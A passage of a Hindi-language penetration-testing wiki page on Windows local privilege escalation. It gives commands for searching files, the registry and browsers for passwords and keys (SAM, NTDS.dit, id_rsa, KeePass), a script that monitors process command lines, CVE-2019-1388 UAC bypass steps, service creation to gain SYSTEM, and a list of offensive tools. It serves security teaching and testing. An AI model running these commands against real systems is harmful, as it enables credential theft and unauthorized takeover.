%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
सभी प्रस्तावित फ़ाइलों की खोज करें:
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### RecycleBin में क्रेडेंशियल्स

आपको इसके अंदर क्रेडेंशियल्स की तलाश के लिए बिन की भी जांच करनी चाहिए

कई प्रोग्राम द्वारा सहेजे गए **पासवर्ड को पुनर्प्राप्त करने** के लिए आप उपयोग कर सकते हैं: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### रजिस्ट्री के अंदर

**क्रेडेंशियल्स के साथ अन्य संभावित रजिस्ट्री कुंजी**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Registry से openssh कुंजी निकालें।**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### ब्राउज़र्स इतिहास

आपको उन dbs की जांच करनी चाहिए जहाँ **Chrome या Firefox** के पासवर्ड संग्रहीत हैं।\
ब्राउज़रों के इतिहास, बुकमार्क और पसंदीदा की भी जांच करें ताकि शायद कुछ **पासवर्ड** वहाँ संग्रहीत हों।

ब्राउज़रों से पासवर्ड निकालने के लिए उपकरण:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL ओवरराइटिंग**

**कंपोनेंट ऑब्जेक्ट मॉडल (COM)** एक तकनीक है जो Windows ऑपरेटिंग सिस्टम के भीतर बनाई गई है जो विभिन्न भाषाओं के सॉफ़्टवेयर घटकों के बीच **अंतरसंवाद** की अनुमति देती है। प्रत्येक COM घटक को **क्लास ID (CLSID)** के माध्यम से **पहचान** की जाती है और प्रत्येक घटक एक या एक से अधिक इंटरफेस के माध्यम से कार्यक्षमता को उजागर करता है, जिसे इंटरफेस IDs (IIDs) के माध्यम से पहचाना जाता है।

COM क्लास और इंटरफेस को रजिस्ट्री में **HKEY\_**_**CLASSES\_**_**ROOT\CLSID** और **HKEY\_**_**CLASSES\_**_**ROOT\Interface** के तहत परिभाषित किया गया है। यह रजिस्ट्री **HKEY\_**_**LOCAL\_**_**MACHINE\Software\Classes** + **HKEY\_**_**CURRENT\_**_**USER\Software\Classes** = **HKEY\_**_**CLASSES\_**_**ROOT** को मिलाकर बनाई गई है।

इस रजिस्ट्री के CLSIDs के अंदर आप बच्चे की रजिस्ट्री **InProcServer32** पा सकते हैं जिसमें एक **डिफ़ॉल्ट मान** होता है जो एक **DLL** की ओर इशारा करता है और एक मान जिसे **ThreadingModel** कहा जाता है जो **Apartment** (सिंगल-थ्रेडेड), **Free** (मल्टी-थ्रेडेड), **Both** (सिंगल या मल्टी) या **Neutral** (थ्रेड न्यूट्रल) हो सकता है।

![](<../../images/image (729).png>)

बुनियादी रूप से, यदि आप किसी भी DLL को **ओवरराइट** कर सकते हैं जो निष्पादित होने जा रही है, तो आप **अधिकार बढ़ा सकते हैं** यदि वह DLL किसी अन्य उपयोगकर्ता द्वारा निष्पादित होने जा रही है।

हमलावरों द्वारा COM Hijacking का उपयोग स्थायीता तंत्र के रूप में कैसे किया जाता है, यह जानने के लिए जांचें:

{{#ref}}
com-hijacking.md
{{#endref}}

### **फाइलों और रजिस्ट्री में सामान्य पासवर्ड खोजें**

**फाइल सामग्री के लिए खोजें**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**एक निश्चित फ़ाइल नाम के साथ फ़ाइल खोजें**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**रजिस्ट्री में कुंजी नामों और पासवर्ड के लिए खोजें**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### पासवर्ड खोजने वाले उपकरण

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **एक msf** प्लगइन है जिसे मैंने **शिकार पर क्रेडेंशियल्स खोजने वाले हर metasploit POST मॉड्यूल को स्वचालित रूप से निष्पादित करने** के लिए बनाया है।\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) स्वचालित रूप से इस पृष्ठ में उल्लिखित पासवर्ड वाले सभी फ़ाइलों की खोज करता है।\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) एक और शानदार उपकरण है जो एक सिस्टम से पासवर्ड निकालता है।

उपकरण [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **सत्रों**, **उपयोगकर्ता नामों** और **पासवर्डों** की खोज करता है जो कई उपकरणों में स्पष्ट पाठ में इस डेटा को सहेजते हैं (PuTTY, WinSCP, FileZilla, SuperPuTTY, और RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

कल्पना करें कि **एक प्रक्रिया जो SYSTEM के रूप में चल रही है एक नई प्रक्रिया खोलती है** (`OpenProcess()`) **पूर्ण पहुंच के साथ**। वही प्रक्रिया **एक नई प्रक्रिया भी बनाती है** (`CreateProcess()`) **कम विशेषाधिकार के साथ लेकिन मुख्य प्रक्रिया के सभी खुले हैंडल विरासत में लेते हुए**।\
फिर, यदि आपके पास **कम विशेषाधिकार वाली प्रक्रिया तक पूर्ण पहुंच है**, तो आप **privileged प्रक्रिया के लिए खोले गए हैंडल को पकड़ सकते हैं** जो `OpenProcess()` के साथ बनाई गई थी और **एक shellcode इंजेक्ट कर सकते हैं**।\
[इस उदाहरण को पढ़ें अधिक जानकारी के लिए **इस भेद्यता का पता लगाने और शोषण करने के बारे में**।](leaked-handle-exploitation.md)\
[इस **अन्य पोस्ट को पढ़ें अधिक पूर्ण व्याख्या के लिए कि कैसे विभिन्न स्तरों की अनुमतियों (केवल पूर्ण पहुंच नहीं) के साथ विरासत में मिली प्रक्रियाओं और थ्रेड्स के अधिक खुले हैंडल का परीक्षण और दुरुपयोग करें**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/)।

## Named Pipe Client Impersonation

साझा मेमोरी खंड, जिसे **pipes** कहा जाता है, प्रक्रिया संचार और डेटा स्थानांतरण की अनुमति देते हैं।

Windows एक सुविधा प्रदान करता है जिसे **Named Pipes** कहा जाता है, जो असंबंधित प्रक्रियाओं को डेटा साझा करने की अनुमति देता है, यहां तक कि विभिन्न नेटवर्कों पर भी। यह एक क्लाइंट/सर्वर आर्किटेक्चर के समान है, जिसमें भूमिकाएँ **named pipe server** और **named pipe client** के रूप में परिभाषित होती हैं।

जब डेटा एक **client** द्वारा एक पाइप के माध्यम से भेजा जाता है, तो **server** जिसने पाइप सेट किया है, **client** की पहचान **अपनाने** की क्षमता रखता है, बशर्ते कि उसके पास आवश्यक **SeImpersonate** अधिकार हों। एक **privileged प्रक्रिया** की पहचान करना जो एक पाइप के माध्यम से संवाद करती है जिसे आप अनुकरण कर सकते हैं, आपको **उच्च विशेषाधिकार प्राप्त करने** का अवसर प्रदान करता है जब वह प्रक्रिया उस पाइप के साथ बातचीत करती है जिसे आपने स्थापित किया है। इस तरह के हमले को निष्पादित करने के लिए निर्देशों के लिए, सहायक मार्गदर्शिकाएँ [**यहाँ**](named-pipe-client-impersonation.md) और [**यहाँ**](#from-high-integrity-to-system) पाई जा सकती हैं।

इसके अलावा, निम्नलिखित उपकरण **burp जैसे उपकरण के साथ एक named pipe संचार को इंटरसेप्ट करने की अनुमति देता है:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **और यह उपकरण सभी पाइपों को सूचीबद्ध करने और privescs खोजने की अनुमति देता है** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Misc

### **Monitoring Command Lines for passwords**

जब एक उपयोगकर्ता के रूप में एक शेल प्राप्त करते हैं, तो कुछ शेड्यूल किए गए कार्य या अन्य प्रक्रियाएँ हो सकती हैं जो **कमांड लाइन पर क्रेडेंशियल्स पास करती हैं**। नीचे दिया गया स्क्रिप्ट हर दो सेकंड में प्रक्रिया कमांड लाइनों को कैप्चर करता है और वर्तमान स्थिति की तुलना पिछले स्थिति से करता है, किसी भी अंतर को आउटपुट करता है।
```powershell
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## पासवर्ड चुराना प्रक्रियाओं से

## लो प्रिविलेज यूजर से NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC बायपास

यदि आपके पास ग्राफिकल इंटरफेस (कंसोल या RDP के माध्यम से) तक पहुंच है और UAC सक्षम है, तो Microsoft Windows के कुछ संस्करणों में एक अनधिकृत उपयोगकर्ता से "NT\AUTHORITY SYSTEM" जैसे किसी भी अन्य प्रक्रिया को चलाना संभव है।

यह प्रिविलेज को बढ़ाने और एक ही समय में UAC को बायपास करने की अनुमति देता है, उसी भेद्यता के साथ। इसके अलावा, कुछ भी स्थापित करने की आवश्यकता नहीं है और प्रक्रिया के दौरान उपयोग किया जाने वाला बाइनरी Microsoft द्वारा साइन और जारी किया गया है।

कुछ प्रभावित सिस्टम निम्नलिखित हैं:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
इस सुरक्षा कमजोरी का लाभ उठाने के लिए, निम्नलिखित चरणों को पूरा करना आवश्यक है:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
आपके पास निम्नलिखित GitHub रिपॉजिटरी में सभी आवश्यक फ़ाइलें और जानकारी हैं:

https://github.com/jas502n/CVE-2019-1388

## Administrator Medium से High Integrity Level / UAC Bypass तक

**Integrity Levels** के बारे में जानने के लिए इसे पढ़ें:

{{#ref}}
integrity-levels.md
{{#endref}}

फिर **UAC और UAC बायपास के बारे में जानने के लिए इसे पढ़ें:**

{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## **High Integrity से System तक**

### **नई सेवा**

यदि आप पहले से ही High Integrity प्रक्रिया पर चल रहे हैं, तो **SYSTEM में पास करना** केवल **एक नई सेवा बनाकर और उसे निष्पादित करके** आसान हो सकता है:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
### AlwaysInstallElevated

एक उच्च इंटीग्रिटी प्रक्रिया से आप **AlwaysInstallElevated रजिस्ट्री प्रविष्टियों को सक्षम करने** और **एक रिवर्स शेल स्थापित करने** की कोशिश कर सकते हैं जो एक _**.msi**_ रैपर का उपयोग करता है।\
[More information about the registry keys involved and how to install a _.msi_ package here.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**आप** [**कोड यहाँ खोज सकते हैं**](seimpersonate-from-high-to-system.md)**।**

### From SeDebug + SeImpersonate to Full Token privileges

यदि आपके पास ये टोकन विशेषाधिकार हैं (संभवतः आप इसे पहले से उच्च इंटीग्रिटी प्रक्रिया में पाएंगे), तो आप **लगभग किसी भी प्रक्रिया को खोलने** में सक्षम होंगे (संरक्षित प्रक्रियाएँ नहीं) SeDebug विशेषाधिकार के साथ, **प्रक्रिया का टोकन कॉपी करें**, और **उस टोकन के साथ एक मनमाना प्रक्रिया बनाएं**।\
इस तकनीक का उपयोग आमतौर पर **SYSTEM के रूप में चल रही किसी भी प्रक्रिया को चुनने के लिए किया जाता है जिसमें सभी टोकन विशेषाधिकार होते हैं** (_हाँ, आप सभी टोकन विशेषाधिकार के बिना SYSTEM प्रक्रियाएँ पा सकते हैं_)।\
**आप एक** [**उदाहरण यहाँ खोज सकते हैं जो प्रस्तावित तकनीक को निष्पादित करता है**](sedebug-+-seimpersonate-copy-token.md)**।**

### **Named Pipes**

यह तकनीक मीटरप्रीटर द्वारा `getsystem` में वृद्धि के लिए उपयोग की जाती है। यह तकनीक **एक पाइप बनाने और फिर उस पाइप पर लिखने के लिए एक सेवा बनाने/दुरुपयोग करने** पर आधारित है। फिर, **सर्वर** जिसने **`SeImpersonate`** विशेषाधिकार का उपयोग करके पाइप बनाया, वह पाइप क्लाइंट (सेवा) के टोकन को **प्रतिनिधित्व** करने में सक्षम होगा जिससे SYSTEM विशेषाधिकार प्राप्त होंगे।\
यदि आप [**नाम पाइप के बारे में अधिक जानना चाहते हैं तो आपको यह पढ़ना चाहिए**](#named-pipe-client-impersonation)।\
यदि आप [**उच्च इंटीग्रिटी से SYSTEM में जाने के लिए नाम पाइप का उपयोग करने का एक उदाहरण पढ़ना चाहते हैं तो आपको यह पढ़ना चाहिए**](from-high-integrity-to-system-with-name-pipes.md)।

### Dll Hijacking

यदि आप **एक dll को हाईजैक करने में सफल होते हैं** जो **SYSTEM** के रूप में चल रही **प्रक्रिया** द्वारा **लोड** की जा रही है, तो आप उन अनुमतियों के साथ मनमाना कोड निष्पादित करने में सक्षम होंगे। इसलिए Dll Hijacking इस प्रकार के विशेषाधिकार वृद्धि के लिए भी उपयोगी है, और, इसके अलावा, यह **उच्च इंटीग्रिटी प्रक्रिया से प्राप्त करना अधिक आसान है** क्योंकि इसके पास **dlls को लोड करने के लिए उपयोग की जाने वाली फ़ोल्डरों पर लिखने की अनुमति होगी**।\
**आप** [**Dll hijacking के बारे में अधिक जान सकते हैं यहाँ**](dll-hijacking/index.html)**।**

### **From Administrator or Network Service to System**

{{#ref}}
https://github.com/sailay1996/RpcSsImpersonator
{{#endref}}

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**पढ़ें:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Windows स्थानीय विशेषाधिकार वृद्धि वेक्टर की खोज के लिए सबसे अच्छा उपकरण:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- गलत कॉन्फ़िगरेशन और संवेदनशील फ़ाइलों की जांच करें (**[**यहाँ जांचें**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**)। पता चला।**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- कुछ संभावित गलत कॉन्फ़िगरेशन की जांच करें और जानकारी एकत्र करें (**[**यहाँ जांचें**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**)।**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- गलत कॉन्फ़िगरेशन की जांच करें**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- यह PuTTY, WinSCP, SuperPuTTY, FileZilla, और RDP सहेजे गए सत्र की जानकारी निकालता है। स्थानीय में -Thorough का उपयोग करें।**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- क्रेडेंशियल मैनेजर से क्रेडेंशियल निकालता है। पता चला।**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- डोमेन के चारों ओर एकत्रित पासवर्ड को स्प्रे करें**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh एक PowerShell ADIDNS/LLMNR/mDNS/NBNS स्पूफर और मैन-इन-द-मिडल उपकरण है।**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- बुनियादी privesc Windows एनुमेरशन**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **\~\~**\~\~ -- ज्ञात privesc कमजोरियों की खोज करें (DEPRECATED for Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- स्थानीय जांच **(एडमिन अधिकारों की आवश्यकता)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- ज्ञात privesc कमजोरियों की खोज करें (इसे VisualStudio का उपयोग करके संकलित करने की आवश्यकता है) ([**पूर्व-संकलित**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- गलत कॉन्फ़िगरेशन की खोज के लिए होस्ट का एनुमरेशन करता है (यह privesc से अधिक जानकारी एकत्र करने का उपकरण है) (संकलित करने की आवश्यकता) **(**[**पूर्व-संकलित**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- कई सॉफ़्टवेयर से क्रेडेंशियल निकालता है (गिटहब में पूर्व-संकलित exe)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- C# में PowerUp का पोर्ट**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **\~\~**\~\~ -- गलत कॉन्फ़िगरेशन की जांच करें (गिटहब में पूर्व-संकलित निष्पादन योग्य)। अनुशंसित नहीं। यह Win10 में ठीक से काम नहीं करता।\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- संभावित गलत कॉन्फ़िगरेशन की जांच करें (पायथन से exe)। अनुशंसित नहीं। यह Win10 में ठीक से काम नहीं करता।

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- इस पोस्ट पर आधारित उपकरण (इसका सही तरीके से काम करने के लिए accesschk की आवश्यकता नहीं है लेकिन इसका उपयोग कर सकता है)।

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo** के आउटपुट को पढ़ता है और कार्यशील एक्सप्लॉइट्स की सिफारिश करता है (स्थानीय पायथन)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo** के आउटपुट को पढ़ता है और कार्यशील एक्सप्लॉइट्स की सिफारिश करता है (स्थानीय पायथन)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

आपको सही .NET संस्करण का उपयोग करके प्रोजेक्ट को संकलित करना होगा ([see this](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). पीड़ित होस्ट पर स्थापित .NET संस्करण देखने के लिए आप कर सकते हैं:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Bibliography

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)\\
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)\\
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)\\
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)\\
- [https://www.youtube.com/watch?v=\_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)\\
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)\\
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)\\
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)\\
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)\\
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)\\
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)\\
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)\\
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)\\
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

{{#include ../../banners/hacktricks-training.md}}
